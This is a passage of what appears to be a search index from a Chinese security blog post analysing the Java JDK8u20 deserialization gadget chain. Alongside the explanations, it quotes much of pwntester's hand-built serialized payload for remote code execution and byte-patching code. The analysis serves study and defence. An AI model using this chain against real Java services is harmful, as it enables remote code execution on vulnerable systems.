0x04, 0x00, 0x00, 0x00, 0x00, 0x70, 0x78\"); bytes[i] = 0x77; bytes[i+1] = 0x04; bytes[i+2] = 0x00; bytes[i+6] = 0x70; break; } } \u4e3a\u4ec0\u4e48\u8981\u8fd9\u4e48\u4fee\u6539\u5b57\u8282\u7801\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u8bd5\u8bd5\u6ce8\u91ca\u8fd9\u6bb5\u4ee3\u7801\u518d\u8fd0\u884c\uff0c\u53d1\u73b0\u4f1a\u51fa\u73b0\u62a5\u9519: at java.io.DataInputStream.readInt(DataInputStream.java:392) at java.io.ObjectInputStream$BlockDataInputStream.readInt(ObjectInputStream.java:2823) at java.io.ObjectInputStream.readInt(ObjectInputStream.java:972) at java.beans.beancontext.BeanContextSupport.deserialize(BeanContextSupport.java:931) at java.beans.beancontext.BeanContextSupport.readObject(BeanContextSupport.java:1084) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:483) at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017) at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1896) at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371) at java.util.HashSet.readObject(HashSet.java:333) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:483) at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017) at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1896) at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801) at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351) at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371) at jdk8u20EXP2.main(jdk8u20EXP2.java:128) Process finished with exit code 1 \u6211\u4eec\u8ddf\u8fdb BeanContextSupport#readObject \u770b\u770b\uff0c\u5176\u4ee3\u7801\u5982\u4e0b: private synchronized void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { synchronized(BeanContext.globalHierarchyLock) { ois.defaultReadObject(); initialize(); bcsPreDeserializationHook(ois); if (serializable > 0 && this.equals(getBeanContextPeer())) readChildren(ois); deserialize(ois, bcmListeners = new ArrayList(1)); } } \u53ef\u4ee5\u770b\u5230\u5728 readChildren \u4e4b\u540e\u8fd8\u4f1a\u6267\u884c deserialize \u65b9\u6cd5\uff0c\u7ee7\u7eed\u8ddf\u8fdb: protected final void deserialize(ObjectInputStream ois, Collection coll) throws IOException, ClassNotFoundException { int count = 0; count = ois.readInt(); while (count-- > 0) { coll.add(ois.readObject()); } } \u4ed6\u8fd9\u91cc\u4f1a\u5c1d\u8bd5\u4ece\u53cd\u5e8f\u5217\u5316\u6d41\u4e2d\u8bfb\u53d6\u4e00\u4e2aInt\uff0c\u5982\u679cInt\u5927\u4e8e0\u7684\u8bdd\uff0c\u5c31\u4f1a\u7ee7\u7eed\u6267\u884c readObject \uff0c\u8fd9\u663e\u7136\u662f\u6211\u4eec\u4e0d\u60f3\u770b\u5230\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06\u5176\u6539\u4e3a0\uff0c\u90a3\u4e48exp3\u662f\u5982\u4f55\u4fee\u6539\u7684\u5462\uff1f TC_NULL - 0x70 // old TC_BLOCKDATA - 0x77 Length - 4 - 0x04 Contents - 0x00000000 TC_ENDBLOCKDATA - 0x78 TC_BLOCKDATA - 0x77 // new Length - 4 - 0x04 Contents - 0x00000000 TC_NULL - 0x70 TC_ENDBLOCKDATA - 0x78 \u6211\u4eec\u624b\u52a8\u4fee\u6539\u5b57\u8282\u7801\u7684\u539f\u56e0\u662f\u6211\u4eectry-catch\u5f02\u5e38\u4e4b\u540e\u5bfc\u81f4\u6b63\u5e38\u7684\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b\u90e8\u5206\u65ad\u5f00\uff0c\u540e\u7eed\u7684\u4e00\u90e8\u5206\u4ee3\u7801\u6ca1\u6709\u6b63\u5e38\u6267\u884c\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u624b\u52a8\u5c06\u540e\u7eed\u7684\u94fe\"\u63a5\u4e0a\"\uff0c\u5177\u4f53\u7684\u65b9\u6cd5\u5982\u4e0a\uff0c\u5c06\u8981\u88ab\u8bfb\u53d6\u7684Int\u4e0a\u79fb\uff0c\u5728java\u4e2d\u4e00\u4e2a\u5047\u5982\u6211\u4eec\u5e8f\u5217\u5316\u4e00\u4e2aInt: out.writeInt(120); \u5176\u4f1a\u5f97\u5230\u4ee5\u4e0b\u51e0\u4e2a\u5b57\u8282\u7801: 77 04 00 00 00 78\uff1a\u8fd9\u6bb5\u4fe1\u606f\u63cf\u8ff0\u4e86\u6574\u6570120\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 \u301077\u3011 TC_BLOCKDATA\uff1a\u53ef\u9009\u7684\u6570\u636e\u5757\uff0c\u53c2\u8003\u540e\u8fb9\u7684\u7ae0\u8282\u5c31\u77e5\u9053\uff0c\u6240\u6709\u57fa\u7840\u7c7b\u578b\u6570\u636e\u7684\u5e8f\u5217\u5316\u90fd\u4f1a\u4f7f\u7528\u6570\u636e\u5757\u7684\u7ed3\u6784\uff1b \u301004\u3011 \u8be5\u503c\u8868\u793a\u5f53\u524d\u5199\u5165\u6570\u636e120\u503c\u5360\u7528\u7684\u5b57\u8282\u6570\uff0c\u56e0\u4e3a\u662fint\u7c7b\u578b\u7684\u6570\u636e\uff0c\u6240\u4ee5\u8fd9\u4e2a120\u7684\u6570\u636e\u5e94\u8be5\u5360\u75284\u4e2a\u5b57\u8282\uff1b \u301000 00 00 78\u3011 \u8fd9\u6bb5\u6570\u636e\u8868\u793a120\u7684 \u503c \uff1b\u5341\u516d\u8fdb\u52360x78\u8f6c\u6362\u6210\u5341\u8fdb\u5236\u5c31\u662f120\uff1b \u800c0x70\u5373TC_NULL\u662f\u4e00\u4e2a\u7ec8\u6b62\u7b26\uff0c\u5176\u5177\u4f53\u610f\u4e49\u5982\u4e0b: TC_NULL\u4e00\u4e2a\u5b57\u8282\u957f\u5ea6\u7684\u6570\u636e\uff0c\u8868\u793anull\u503c\uff0c\u4e00\u822c\u8fd9\u4e2a\u503c\u8868\u793a\u7684\u662f\u5bf9\u8c61\u7684\u7a7a\u5f15\u7528\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u8868\u793a\u9012\u5f52\u7ee7\u627f\u7ec8\u6b62\u7b26 \u6240\u4ee5exp3\u4e0a\u8ff0\u4e24\u4e2a\u624b\u52a8\u4fee\u6539\u5b57\u8282\u7801\u7684\u76ee\u7684\u5c31\u662f\u4e3a\u4e86\u5f25\u8865\u53cd\u5e8f\u5217\u5316\u5f02\u5e38\u7ec8\u6b62\u4e4b\u540e\u7684\u540e\u679c\uff0c\u4f7f\u5f97\u540e\u7eed\u53cd\u5e8f\u5217\u5316\u80fd\u591f\u6b63\u5e38\u8fd0\u884c\u3002 \u53c2\u8003\u6587\u7ae0 # https://paper.seebug.org/1232/ https://xz.aliyun.com/t/7240 https://xz.aliyun.com/t/8277 https://xz.aliyun.com/t/9566 https://xz.aliyun.com/t/9765 https://mp.weixin.qq.com/s/SMq6aE5-qV9cINv1-74RgA https://mp.weixin.qq.com/s/3bJ668GVb39nT0NDVD-3IA https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/ https://www.anquanke.com/post/id/87270 https://blog.csdn.net/silentbalanceyh/article/details/8183849","title":"\u53cd\u5e8f\u5217\u5316\u7bc7\u4e4bJDK8u20"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#\u53cd\u5e8f\u5217\u5316\u7bc7\u4e4bjdk8u20","text":"","title":"\u53cd\u5e8f\u5217\u5316\u7bc7\u4e4bJDK8u20"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#\u4e66\u63a5\u4e0a\u6587","text":"\u5728JDK7u21\u4e2d\u4fee\u590dJDK7u21\u94fe\u7684\u65b9\u5f0f\u662f\u5224\u65ad AnnotationInvocationHandler \u7684 type \u5c5e\u6027\u662f\u5426\u4e3a\u6ce8\u89e3\u7c7b\uff0c\u5982\u679c\u4e0d\u662f\u7684\u8bdd\u5219\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\u3002 \u8fd9\u91cc\u6211\u4eec\u9700\u8981\u6ce8\u610f\u7684\u662f\u5728\u629b\u51fa\u5f02\u5e38\u4e4b\u524d\uff0c\u5df2\u7ecf\u6267\u884c\u4e86 var1.defaultReadObject() \u8fd8\u539f\u4e86 AnnotationInvocationHandler \u5bf9\u8c61\uff0c\u4f46\u662f\u7531\u4e8e\u540e\u7eed\u629b\u51fa\u5f02\u5e38\uff0c\u5bfc\u81f4\u6211\u4eec\u6574\u4e2a\u53cd\u5e8f\u5217\u5316\u903b\u8f91\u65ad\u5f00\uff0c\u7a0b\u5e8f\u7ec8\u6b62\u8fd0\u884c\uff0c\u90a3\u4e48\u6211\u4eec\u662f\u5426\u53ef\u80fd\u4f7f\u7a0b\u5e8f\u5728\u629b\u51fa\u5f02\u5e38\u4e4b\u540e\u4e5f\u80fd\u591f\u7ee7\u7eed\u6267\u884c\u5462\uff1f","title":"\u4e66\u63a5\u4e0a\u6587"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#try-catch\u5d4c\u5957","text":"\u5047\u8bbe\u5b58\u5728\u4ee5\u4e0b\u4ee3\u7801\uff0c\u601d\u8003\u4e00\u4e0b\u6700\u7ec8\u7684\u8fd0\u884c\u7ed3\u679c\u662f\u4ec0\u4e48\uff1f public static void main ( String [] args ) throws Exception { try { System . out . println ( \"Start\" ); try { int a = 1 / 0 ; } catch ( ArithmeticException e ) { throw new InvalidObjectException ( \"Invalid\" ); System . out . println ( \"In\" ); } } catch ( Exception e ) { } System . out . println ( \"End\" ); } \u6700\u7ec8\u7684\u6570\u636e\u7ed3\u679c\u4e3a Start End \u8fd9\u91cc\u5176\u5b9e\u5c31\u6d89\u53ca\u5230java\u7684\u5f02\u5e38\u6355\u6349\u673a\u5236\uff0c\u5047\u5982\u5728\u4e00\u4e2a\u5d4c\u5957try-catch\u7ed3\u6784\u5185\uff0c\u5185\u90e8\u7684try-catch\u6700\u7ec8\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\uff0c\u800c\u5916\u90e8\u7684try-catch\u6b63\u5e38\u6267\u884c\uff0c\u7531\u4e8e\u5185\u90e8\u7684try-catch\u629b\u51fa\u5f02\u5e38\uff0c\u5916\u90e8\u7684try-catch\u4e5f\u4f1a\u89e6\u53d1catch\uff0c\u4f46\u662f\u5047\u5982\u5916\u90e8\u7684catch\u4e0d\u518d\u5411\u5916\u629b\u51fa\u5f02\u5e38\u800c\u662f\u5ffd\u7565\uff0c\u90a3\u4e48\u6574\u4e2a\u7a0b\u5e8f\u5c31\u4e0d\u4f1a\u7ec8\u7aef\u8fd0\u884c\uff0c\u800c\u662f\u4f1a\u4e00\u76f4\u8fd0\u884c\u76f4\u5230End\uff0c\u8fd9\u5c31\u662f\u6211\u4eec\u60f3\u8981\u7684\u3002 \u73b0\u5728\u6211\u4eec\u9700\u8981\u5bfb\u627e\u5230\u4e00\u4e2a\u7c7b\uff0c\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6: 1. \u5b9e\u73b0 Serializable 2. \u91cd\u5199\u4e86 readObject \u65b9\u6cd5 3. readObject \u65b9\u6cd5\u8fd8\u5b58\u5728\u5bf9 readObject \u7684\u8c03\u7528\uff0c\u5e76\u4e14\u5bf9\u8c03\u7528\u7684 readObject \u65b9\u6cd5\u8fdb\u884c\u4e86\u5f02\u5e38\u6355\u83b7\u5e76\u7ee7\u7eed\u6267\u884c","title":"try-catch\u5d4c\u5957"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#beancontextsupport","text":"\u6700\u7ec8\u6211\u4eec\u627e\u5230\u4e86\u60f3\u8981\u7684\u7c7b: java.beans.beancontext.BeanContextSupport \uff0c\u5176\u5173\u952e\u4ee3\u7801\u5982\u4e0b: private synchronized void readObject ( ObjectInputStream ois ) throws IOException , ClassNotFoundException { synchronized ( BeanContext . globalHierarchyLock ) { ois . defaultReadObject (); initialize (); bcsPreDeserializationHook ( ois ); if ( serializable > 0 && this . equals ( getBeanContextPeer ())) readChildren ( ois ); deserialize ( ois , bcmListeners = new ArrayList ( 1 )); } } public final void readChildren ( ObjectInputStream ois ) throws IOException , ClassNotFoundException { int count = serializable ; while ( count -- > 0 ) { Object child = null ; BeanContextSupport . BCSChild bscc = null ; try { child = ois . readObject (); bscc = ( BeanContextSupport . BCSChild ) ois . readObject (); } catch ( IOException ioe ) { continue ; } catch ( ClassNotFoundException cnfe ) { continue ; } // ... }","title":"BeanContextSupport"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#\u5e8f\u5217\u5316\u673a\u5236","text":"","title":"\u5e8f\u5217\u5316\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#\u5f15\u7528\u673a\u5236","text":"\u5728\u5e8f\u5217\u5316\u6d41\u7a0b\u4e2d\uff0c\u5bf9\u8c61\u6240\u5c5e\u7c7b\u3001\u5bf9\u8c61\u6210\u5458\u5c5e\u6027\u7b49\u6570\u636e\u90fd\u4f1a\u88ab\u4f7f\u7528\u56fa\u5b9a\u7684\u8bed\u6cd5\u5199\u5165\u5230\u5e8f\u5217\u5316\u6570\u636e\uff0c\u5e76\u4e14\u4f1a\u88ab\u7279\u5b9a\u7684\u65b9\u6cd5\u8bfb\u53d6\uff1b\u5728\u5e8f\u5217\u5316\u6570\u636e\u4e2d\uff0c\u5b58\u5728\u7684\u5bf9\u8c61\u6709null\u3001new objects\u3001classes\u3001arrays\u3001strings\u3001back references\u7b49\uff0c\u8fd9\u4e9b\u5bf9\u8c61\u5728\u5e8f\u5217\u5316\u7ed3\u6784\u4e2d\u90fd\u6709\u5bf9\u5e94\u7684\u63cf\u8ff0\u4fe1\u606f\uff0c\u5e76\u4e14\u6bcf\u4e00\u4e2a\u5199\u5165\u5b57\u8282\u6d41\u7684\u5bf9\u8c61\u90fd\u4f1a\u88ab\u8d4b\u4e88\u5f15\u7528 Handle \uff0c\u5e76\u4e14\u8fd9\u4e2a\u5f15\u7528 Handle \u53ef\u4ee5\u53cd\u5411\u5f15\u7528\u8be5\u5bf9\u8c61\uff08\u4f7f\u7528 TC_REFERENCE \u7ed3\u6784\uff0c\u5f15\u7528\u524d\u9762handle\u7684\u503c\uff09\uff0c\u5f15\u7528 Handle \u4f1a\u4ece 0x7E0000 \u5f00\u59cb\u8fdb\u884c\u987a\u5e8f\u8d4b\u503c\u5e76\u4e14\u81ea\u52a8\u81ea\u589e\uff0c\u4e00\u65e6\u5b57\u8282\u6d41\u53d1\u751f\u4e86\u91cd\u7f6e\u5219\u8be5\u5f15\u7528Handle\u4f1a\u91cd\u65b0\u4ece 0x7E0000 \u5f00\u59cb\u3002 \u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u5982\u4e0b: import java.io.* ; public class exp implements Serializable { private static final long serialVersionUID = 100L ; public static int num = 0 ; private void readObject ( ObjectInputStream input ) throws Exception { input . defaultReadObject (); } public static void main ( String [] args ) throws IOException { exp t = new exp (); ObjectOutputStream out = new ObjectOutputStream ( new FileOutputStream ( \"test\" )); out . writeObject ( t ); out . writeObject ( t ); //\u7b2c\u4e8c\u6b21\u5199\u5165 out . close (); } } \u6211\u4eec\u7528SerializationDumper\u8fd9\u4e2a\u5de5\u5177\u6765\u67e5\u770b\u5176\u5e8f\u5217\u5316\u540e\u7684\u6570\u636e: STREAM_MAGIC - 0xac ed STREAM_VERSION - 0x00 05 Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 3 - 0x00 03 Value - exp - 0x657870 serialVersionUID - 0x00 00 00 00 00 00 00 64 newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 0 - 0x00 00 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 01 classdata exp values TC_REFERENCE - 0x71 Handle - 8257537 - 0x00 7e 00 01 \u53ef\u4ee5\u6ce8\u610f\u5230\u5728\u6700\u540e\u90e8\u5206\u51fa\u73b0\u4e86 TC_REFERENCE \u5757\uff0c\u90a3\u4e48\u53cd\u5e8f\u5217\u5316\u65f6\u8981\u5982\u4f55\u5904\u7406 TC_REFERENCE \u5757\u5462\uff1f private Object readObject0 ( boolean unshared ) throws IOException { boolean oldMode = bin . getBlockDataMode (); if ( oldMode ) { int remain = bin . currentBlockRemaining (); if ( remain > 0 ) { throw new OptionalDataException ( remain ); } else if ( defaultDataEnd ) { /* * Fix for 4360508: stream is currently at the end of a field * value block written via default serialization; since there * is no terminating TC_ENDBLOCKDATA tag, simulate * end-of-custom-data behavior explicitly. */ throw new OptionalDataException ( true ); } bin . setBlockDataMode ( false ); } byte tc ; while (( tc = bin . peekByte ()) == TC_RESET ) { bin . readByte (); handleReset (); } depth ++ ; try { switch ( tc ) { // ... case TC_REFERENCE : return readHandle ( unshared ); // ... } } catch () { // ... } // ... readHandle\u65b9\u6cd5\u4ee3\u7801\u5982\u4e0b: private Object readHandle ( boolean unshared ) throws IOException { if ( bin . readByte () != TC_REFERENCE ) { throw new InternalError (); } passHandle = bin . readInt () - baseWireHandle ; if ( passHandle < 0 || passHandle >= handles . size ()) { throw new StreamCorruptedException ( String . format ( \"invalid handle value: %08X\" , passHandle + baseWireHandle )); } if ( unshared ) { // REMIND: what type of exception to throw here? throw new InvalidObjectException ( \"cannot read back reference as unshared\" ); } Object obj = handles . lookupObject ( passHandle ); if ( obj == unsharedMarker ) { // REMIND: what type of exception to throw here? throw new InvalidObjectException ( \"cannot read back reference to unshared object\" ); } return obj ; } \u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u4ece\u5b57\u8282\u6d41\u4e2d\u8bfb\u53d6 TC_REFERENCE \u6807\u8bb0\u6bb5\uff0c\u5b83\u4f1a\u628a\u8bfb\u53d6\u7684\u5f15\u7528 Handle \u8d4b\u503c\u7ed9 passHandle \u53d8\u91cf\uff0c\u7136\u540e\u4f20\u5165 lookupObject() \uff0c\u5728 lookupObject() \u65b9\u6cd5\u4e2d\uff0c\u5982\u679c\u5f15\u7528\u7684 handle \u4e0d\u4e3a\u7a7a\u3001\u6ca1\u6709\u5173\u8054\u7684 ClassNotFoundException \uff08 status[handle] != STATUS_EXCEPTION \uff09\uff0c\u90a3\u4e48\u5c31\u8fd4\u56de\u7ed9\u5b9a handle \u7684\u5f15\u7528\u5bf9\u8c61\uff0c\u6700\u540e\u7531 readHandle \u65b9\u6cd5\u8fd4\u56de\u7ed9\u5bf9\u8c61\u3002 \u4e5f\u5c31\u662f\u8bf4\uff0c\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b\u8fd8\u539f\u5230 TC_REFERENCE \u7684\u65f6\u5019\uff0c\u4f1a\u5c1d\u8bd5\u8fd8\u539f\u5f15\u7528\u7684 handle \u5bf9\u8c61\u3002","title":"\u5f15\u7528\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#\u6210\u5458\u629b\u5f03\u673a\u5236","text":"\u5728\u53cd\u5e8f\u5217\u5316\u4e2d\uff0c\u5982\u679c\u5f53\u524d\u8fd9\u4e2a\u5bf9\u8c61\u4e2d\u7684\u67d0\u4e2a\u5b57\u6bb5\u5e76\u6ca1\u6709\u5728\u5b57\u8282\u6d41\u4e2d\u51fa\u73b0\uff0c\u5219\u8fd9\u4e9b\u5b57\u6bb5\u4f1a\u4f7f\u7528\u7c7b\u4e2d\u5b9a\u4e49\u7684\u9ed8\u8ba4\u503c\uff0c\u5982\u679c\u8fd9\u4e2a\u503c\u51fa\u73b0\u5728\u5b57\u8282\u6d41\u4e2d\uff0c \u4f46\u662f\u5e76\u4e0d\u5c5e\u4e8e\u5bf9\u8c61\uff0c\u5219\u629b\u5f03\u8be5\u503c\uff0c\u4f46\u662f\u5982\u679c\u8fd9\u4e2a\u503c\u662f\u4e00\u4e2a\u5bf9\u8c61\u7684\u8bdd\uff0c\u90a3\u4e48\u4f1a\u4e3a\u8fd9\u4e2a\u503c\u5206\u914d\u4e00\u4e2a Handle\u3002","title":"\u6210\u5458\u629b\u5f03\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#\u5229\u7528\u8fd9\u4e9b\u673a\u5236","text":"\u4e86\u89e3\u4e86\u4e0a\u97622\u4e2a\u673a\u5236\u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u60f3\u5230\u4e00\u4e2a\u7ed5\u8fc7jdk7u21\u4fee\u590d\u65b9\u6cd5\u7684\u673a\u5236\uff0c\u5373: 1. \u4f7f\u7528 BeanContextSupport \uff0c\u5229\u7528\u5176\u7279\u6b8a\u7684 readChildren \u65b9\u6cd5\u8fd8\u539f\u4e00\u4e2a\u975e\u6cd5\u7684 AnnotationInvocationHandler \u5bf9\u8c61\uff0c\u5e76\u7559\u4e0b\u4e00\u4e2aHandle 2. \u5728\u6211\u4eecHashObject\u53d1\u751f\u54c8\u5e0c\u78b0\u649e\u9020\u6210RCE\u4e4b\u524d\u8fd8\u539f\u975e\u6cd5\u7684 AnnotationInvocationHandler \u5bf9\u8c61\uff0c\u4f7f\u5f97\u4e4b\u540e\u53cd\u5e8f\u5217\u5316\u76f8\u540c\u5bf9\u8c61\u65f6\u8fd8\u539f\u5f15\u7528\u7684 handle \u5bf9\u8c61","title":"\u5229\u7528\u8fd9\u4e9b\u673a\u5236"},{"location":"%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BJDK8u20/#exp1","text":"\u8fd9\u4e2aexp1\u6765\u81eapwntester\u5e08\u5085\uff0c\u76f4\u63a5\u901a\u8fc7\u624b\u52a8\u6784\u9020\u53cd\u5e8f\u5217\u5316\u7684\u5b57\u8282\u7801\u6765\u5199\u8fd9\u4e2a\u7578\u5f62\u7684JDK8u20\u94fe(\u771f\u662f\u592a\u5f3a\u4e86)\uff0c\u4e0d\u8fc7\u7406\u89e3\u8d77\u6765\u53ef\u80fd\u4f1a\u6709\u70b9\u56f0\u96be\uff0c\u5229\u7528\u5230\u4e86\u6210\u5458\u629b\u5f03\u673a\u5236\uff0c\u5b8c\u6574\u6e90\u7801\u5728 pwntester/JRE8u20 RCE Gadget : ... new Object [] { STREAM_MAGIC , STREAM_VERSION , // stream headers // (1) LinkedHashSet TC_OBJECT , TC_CLASSDESC , LinkedHashSet . class . getName (), - 2851667679971038690L , ( byte ) 2 , // flags ( short ) 0 , // field count TC_ENDBLOCKDATA , TC_CLASSDESC , // super class HashSet . class . getName (), - 5024744406713321676L , ( byte ) 3 , // flags ( short ) 0 , // field count TC_ENDBLOCKDATA , TC_NULL , // no superclass // Block data that will be read by HashSet.readObject() // Used to configure the HashSet (capacity, loadFactor, size and items) TC_BLOCKDATA , ( byte ) 12 , ( short ) 0 , ( short ) 16 , // capacity ( short ) 16192 , ( short ) 0 , ( short ) 0 , // loadFactor ( short ) 2 , // size // (2) First item in LinkedHashSet templates , // TemplatesImpl instance with malicious bytecode // (3) Second item in LinkedHashSet // Templates Proxy with AIH handler TC_OBJECT , TC_PROXYCLASSDESC , // proxy declaration 1 , // one interface Templates . class . getName (), // the interface implemented by the proxy TC_ENDBLOCKDATA , TC_CLASSDESC , Proxy . class . getName (), // java.lang.Proxy class desc - 2222568056686623797L , // serialVersionUID SC_SERIALIZABLE , // flags ( short ) 2 , // field count ( byte ) 'L' , \"dummy\" , TC_STRING , \"Ljava/lang/Object;\" , // dummy non-existent field ( byte ) 'L' , \"h\" , TC_STRING , \"Ljava/lang/reflect/InvocationHandler;\" , // h field TC_ENDBLOCKDATA , TC_NULL , // no superclass // (3) Field values // value for the dummy field <--- BeanContextSupport. // this field does not actually exist in the Proxy class, so after deserialization this object is ignored. // (4) BeanContextSupport TC_OBJECT , TC_CLASSDESC , BeanContextSupport . class . getName (), - 4879613978649577204L , // serialVersionUID ( byte ) ( SC_SERIALIZABLE | SC_WRITE_METHOD ), ( short ) 1 , // field count ( byte ) 'I' , \"serializable\" , // serializable field, number of serializable children TC_ENDBLOCKDATA , TC_CLASSDESC , // super class BeanContextChildSupport . class . getName (), 6328947014421475877L , SC_SERIALIZABLE , ( short ) 1 , // field count ( byte ) 'L' , \"beanContextChildPeer\" , TC_STRING , \"Ljava/beans/beancontext/BeanContextChild;\" , TC_ENDBLOCKDATA , TC_NULL , // no superclass // (4) Field values // beanContextChildPeer must point back to this BeanContextSupport for BeanContextSupport.readObject to go into BeanContextSupport.readChildren() TC_REFERENCE , baseWireHandle + 12 , // serializable: one serializable child 1 , // now we add an extra object that is not declared, but that will be read/consumed by readObject // BeanContextSupport.readObject calls readChildren because we said we had one serializable child but it is not in the byte array // so the call to child = ois.readObject() will deserialize next object in the stream: the AnnotationInvocationHandler // At this point we enter the readObject of the aih that will throw an exception after deserializing its default objects // (5) AIH that will be deserialized as part of the BeanContextSupport TC_OBJECT , TC_CLASSDESC , \"sun.reflect.annotation.AnnotationInvocationHandler\" , 6182022883658399397L , // serialVersionUID ( byte ) ( SC_SERIALIZABLE | SC_WRITE_METHOD ), ( short ) 2 , // field count ( byte ) 'L' , \"type\" , TC_STRING , \"Ljava/lang/Class;\" , // type field ( byte ) 'L' , \"memberValues\" , TC_STRING , \"Ljava/util/Map;\" , // memberValues field TC_ENDBLOCKDATA , TC_NULL , // no superclass // (5) Field Values Templates . class , // type field value map , // memberValues field value // note: at this point normally the BeanContextSupport.readChildren would try to read the // BCSChild; but because the deserialization of the AnnotationInvocationHandler above throws, // we skip past that one into the catch block, and continue out of readChildren // the exception takes us out of readChildren and into BeanContextSupport.readObject // where there is a call to deserialize(ois, bcmListeners = new ArrayList(1)); // Within deserialize() there is an int read (0) and then it will read as many obejcts (0) TC_BLOCKDATA , ( byte ) 4 , // block length 0 , // no BeanContextSupport.bcmListenes TC_ENDBLOCKDATA , // (6) value for the Proxy.h field TC_REFERENCE , baseWireHandle + offset + 16 , // refer back to the AnnotationInvocationHandler TC_ENDBLOCKDATA , }; ... 1. \u6784\u9020 LinkedHashSet \u7684\u7ed3\u6784\u4fe1\u606f 2. \u5199\u5165payload\u4e2d TemplatesImpl \u5bf9\u8c61 3. \u6784\u9020 Templates Proxy \u7684\u7ed3\u6784\uff0c\u4e00\u51712\u4e2a\u6210\u5458: 1. \u8fd9\u91cc\u5b9a\u4e49\u4e86\u4e00\u4e2a\u865a\u5047\u7684 dummy \u6210\u5458,\u540e\u7eed\u8d4b\u503c\u4e3a BeanContextSupport \u5bf9\u8c61\uff0c\u865a\u5047\u6210\u5458\u4e5f\u4f1a\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c 2. \u771f\u5b9e\u7684 h \u6210\u5458\uff0c\u540e\u7eed\u8d4b\u503c\u4e3a InvocationHandler \u5bf9\u8c61 4. \u8d4b\u503c dummy \u6210\u5458\u7684\u503c\u4e3a BeanContextSupport \u5bf9\u8c61\uff0c\u540c\u65f6\u6784\u5efa\u4e86\u5176\u7ed3\u6784\u3002\u8fd9\u91cc\u4e3a\u4e86 BeanContextSupport \u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u65f6\u80fd\u8d70\u5230 readChildren \u65b9\u6cd5\uff0c\u505a\u4e86\u4ee5\u4e0b2\u4e2a\u64cd\u4f5c: 1. \u8bbe\u7f6e serializable >0 2. \u7236\u7c7b beanContextChildPeer 